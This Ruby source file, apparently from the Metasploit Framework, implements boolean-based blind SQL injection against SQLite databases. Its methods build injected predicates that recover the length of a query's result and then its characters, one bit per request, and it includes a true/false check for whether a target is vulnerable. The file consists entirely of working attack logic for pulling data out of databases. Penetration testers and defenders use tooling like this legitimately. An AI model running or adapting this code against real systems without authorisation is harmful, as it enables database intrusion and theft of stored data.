#
#   Boolean-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  #
  #   Gets the output of the given SQL query, in a boolean-based blind manner.
  #   The block given to initialize must return true if querying its parameter
  #   gave a result, false otherwise.
  #   @param query [String] The SQL query to execute
  #   @return [String] The query results
  #
  def run_sql(query)
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode_strings
      query = hex_encode_strings(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    output_length = 0
    i = 0
    loop do
      output_bit = blind_request("length(cast((#{query}) as blob))&#{1 << i}<>0")
      output_length |= (1 << i) if output_bit
      i += 1
      stop = blind_request("length(cast((#{query}) as blob))/#{1 << i}=0")
      break if stop # substr returned an empty string, end of input
    end
    puts "[*] Boolean-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    output = output_length.times.map do |j|
      current_character = 0
      8.times do |k|
        # the query below: the inner substr returns a character from the result, the outer returns a bit of it
        output_bit = blind_request("unicode(substr(cast((#{query}) as blob), #{j + 1}, 1))&#{1 << k}<>0")
        current_character |= (1 << k) if output_bit
      end
      extracted_char = current_character.chr
      print extracted_char if @verbose
      extracted_char
    end.join
    print "\n" if @verbose
    output
  end

  #
  # This method checks if the target is vulnerable to Blind boolean-based injection by checking that
  # the values returned by the bloc for some boolean queries are correct.
  #
  def test_vulnerable
    out_true = blind_request('1=1')
    out_false = blind_request('1=2')
    out_true && !out_false
  end

  private

  #
  # Checks the options specific to boolean-based blind SQL injections on MySQL
  #
  def check_opts(opts)
    super
  end

  #
  # Performs one request, should leak one bit of information
  # (if return value is not false or nil, 1, 0 otherwise)
  #
  def blind_request(query)
    @query_proc.call(query)
  end

  #
  # See SQLi#hex_encode_strings
  #
  def hex_encode_strings(query)
    super
  end
end
